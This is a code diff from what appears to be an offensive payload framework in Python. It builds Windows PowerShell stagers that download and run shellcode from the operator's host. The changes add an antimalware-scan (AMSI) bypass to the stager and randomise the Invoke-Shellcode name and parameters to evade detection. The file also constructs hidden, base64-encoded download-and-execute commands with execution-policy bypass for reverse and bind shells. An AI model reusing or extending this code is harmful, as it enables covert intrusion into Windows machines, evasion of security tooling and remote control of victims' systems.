@@ -1,6 +1,7 @@
 from __future__ import unicode_literals
 from main import *
 from menu import *
+from main import amsiPatch
 from prompt_toolkit.contrib.completers import WordCompleter
 
 history = prompt_toolkit.history.InMemoryHistory()
@@ -32,20 +33,20 @@ def printListener(printit=True, returnit=False):
         bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', patch_stdout=True, completer=WordCompleter(['b', 'r'])).lower()
         if bindOrReverse == 'b' or bindOrReverse == 'r':
             break
+    powershellContent = open('lib/powershell/stager.ps1', 'r').read()
     if bindOrReverse == 'r':
-        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('False', returnIP(), '5555')
     if bindOrReverse == 'b':
-        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('True', '', '5556')
 
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
-        powershellStagerFile.write(windows_powershell_stager)
+        stager_content = amsiPatch + windows_powershell_stager
+        powershellStagerFile.write(stager_content)
         powershellStagerFile.close()
 
-    randoStagerDLPort = FUNCTIONS().randomUnusedPort()
+    randoStagerDLPort = randomUnusedPort()
 
-    FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+    DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
     stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if printit:
@@ -153,11 +154,16 @@ def clientUpload(powershellExec, isExe, json):
     clientnumber = checkUpload()
     if clientnumber:
         if isExe:
-            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
-            moduleport = FUNCTIONS().randomUnusedPort()
-            FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+            newpayloadlayout = powershellShellcodeLayout(powershellExec)
+            moduleport = randomUnusedPort()
+            powershellChanges = randomisePS1('Invoke-Shellcode')
+            filename = powershellChanges.get('filename')
+            pForce = powershellChanges['params'].get('Force')
+            pCode = powershellChanges['params'].get('Shellcode')
+
+            DoServe(returnIP(), "", "./externalmodules/staged", port=moduleport, printIt=False)
             encPowershell = getSandboxScripts('powershell')
-            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
+            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');Start-Sleep 30;%s -%s -%s @(%s)"%(returnIP(), moduleport, filename, filename, pForce, pCode, newpayloadlayout.rstrip(','))
             encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
             fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
             b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
